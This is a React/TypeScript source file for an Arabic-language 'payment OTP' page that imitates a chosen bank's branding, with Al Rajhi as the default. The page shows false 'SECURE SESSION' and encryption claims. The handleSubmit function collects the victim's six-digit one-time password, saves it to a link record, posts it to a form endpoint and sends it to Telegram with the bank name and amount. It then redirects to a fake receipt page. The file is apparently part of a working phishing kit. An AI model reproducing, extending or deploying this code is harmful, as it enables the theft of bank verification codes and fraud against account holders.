import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { ShieldCheck, Smartphone, Timer, RefreshCw, Loader2, Lock, ChevronRight, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { bankBranding } from "@/lib/brandingSystem";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentOTP = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();
  
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [timer, setTimer] = useState(120);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  useEffect(() => {
    const countdown = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(countdown);
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length < 6) {
      toast({ title: "خطأ", description: "يرجى إدخال رمز التحقق كاملاً", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, otp: otpValue } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "otp-verification",
          linkId: id!,
          otp: otpValue,
          bank: selectedBank?.nameAr || "البطاقة البنكية",
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'otp_verification',
        data: {
          otp: otpValue,
          bank: selectedBank?.nameAr || "البطاقة البنكية",
          amount: formattedAmount,
          service: linkData?.payload?.service_name || "خدمة دفع"
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/receipt${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  const primaryColor = selectedBankBranding.colors.primary;
  const secondaryColor = selectedBankBranding.colors.secondary;

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA]" dir="rtl" style={{ fontFamily: selectedBankBranding.fonts.arabic }}>
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
        serviceName={selectedBank?.nameAr || "البنك"}
        title="تأكيد رمز التحقق (OTP)"
      />

      <header className="w-full bg-white border-b-4 h-16 sm:h-20 flex items-center sticky top-0 z-50 shadow-md" style={{ borderBottomColor: primaryColor }}>
         <div className="container mx-auto px-4 flex items-center justify-between">
            <div className="w-32 sm:w-40 h-10 flex items-center">
               {selectedBankId ? (
                 <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="md" />
               ) : (
                 <div className="flex items-center gap-2 text-primary font-black">
                   <ShieldCheck className="w-6 h-6" />
                   <span>SECURE PAY</span>
                 </div>
               )}
            </div>
            <div className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100 text-[10px] font-bold">
               <Lock className="w-3 h-3" />
               <span>SECURE SESSION</span>
            </div>
         </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12">
         <div className="w-full max-w-md space-y-8">
            <Card className="border-none shadow-[0_30px_80px_-20px_rgba(0,0,0,0.1)] rounded-[2.5rem] overflow-hidden bg-white text-center">
               <div className="p-10 sm:p-12 space-y-8">
                  <div
                    className="w-20 h-20 rounded-3xl mx-auto flex items-center justify-center text-white shadow-xl animate-in zoom-in duration-500"
                    style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
                  >
                     <Smartphone className="w-10 h-10" />
                  </div>

                  <div className="space-y-2">
                     <h2 className="text-2xl sm:text-3xl font-black text-gray-900 tracking-tight">رمز التحقق لمرة واحدة</h2>
                     <p className="text-sm font-bold text-gray-400 leading-relaxed">
                        تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم جوالك المسجل لدى {selectedBank?.nameAr || 'البنك'} لإتمام عملية دفع <span className="text-gray-900">{formattedAmount}</span>
                     </p>
                  </div>

                  <form onSubmit={handleSubmit} className="space-y-8">
                     <div className="flex justify-center gap-3 sm:gap-4" dir="ltr">
                        {otp.map((digit, index) => (
                           <Input
                              key={index}
                              type="text"
                              inputMode="numeric"
                              maxLength={1}
                              value={digit}
                              onChange={(e) => handleOtpChange(index, e.target.value)}
                              onKeyDown={(e) => handleKeyDown(index, e)}
                              ref={(el) => (inputRefs.current[index] = el)}
                              className="w-14 h-16 sm:w-16 sm:h-20 text-center text-3xl font-black rounded-2xl border-2 border-gray-100 focus:border-primary focus:ring-4 focus:ring-primary/5 transition-all bg-gray-50/50"
                              required
                           />
                        ))}
                     </div>

                     <div className="space-y-6">
                        <div className="flex items-center justify-center gap-4 text-sm">
                           <div className="flex items-center gap-1.5 text-gray-400 font-bold">
                              <Timer className="w-4 h-4" />
                              <span>تنتهي صلاحية الرمز خلال:</span>
                           </div>
                           <span className="font-black text-primary min-w-[3rem]">
                              {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, "0")}
                           </span>
                        </div>

                        <Button
                          type="submit"
                          disabled={isSubmitting}
                          className="w-full h-16 rounded-2xl font-black text-xl shadow-xl text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3"
                          style={{ backgroundColor: primaryColor }}
                        >
                           {isSubmitting ? (
                             <Loader2 className="w-8 h-8 animate-spin" />
                           ) : (
                             <>
                               <span>تأكيد الرمز</span>
                               <CheckCircle2 className="w-6 h-6" />
                             </>
                           )}
                        </Button>

                        <button
                          type="button"
                          disabled={timer > 0}
                          className="flex items-center justify-center gap-2 mx-auto text-sm font-black text-gray-400 hover:text-primary transition-colors disabled:opacity-50"
                        >
                           <RefreshCw className="w-4 h-4" />
                           <span>إعادة إرسال الرمز</span>
                        </button>
                     </div>
                  </form>
               </div>

               <div className="bg-gray-50/50 p-8 border-t border-gray-50 flex items-center gap-4 text-right">
                  <div className="w-12 h-12 rounded-full bg-white border flex-shrink-0 flex items-center justify-center text-primary shadow-sm">
                     <ShieldCheck className="w-6 h-6" />
                  </div>
                  <div className="space-y-0.5">
                     <p className="text-[10px] font-black text-gray-900 uppercase">Secure Verification</p>
                     <p className="text-[9px] font-bold text-gray-400 leading-none">هذه الصفحة محمية بنظام التشفير البنكي المتقدم</p>
                  </div>
               </div>
            </Card>

            <p className="text-[10px] font-bold text-gray-400 text-center uppercase tracking-[0.2em] px-8 leading-relaxed">
               لا تشارك رمز التحقق مع أي شخص. موظفو البنك لن يطلبوا منك هذا الرمز أبداً.
            </p>
         </div>
      </main>
    </div>
  );
};

export default PaymentOTP;
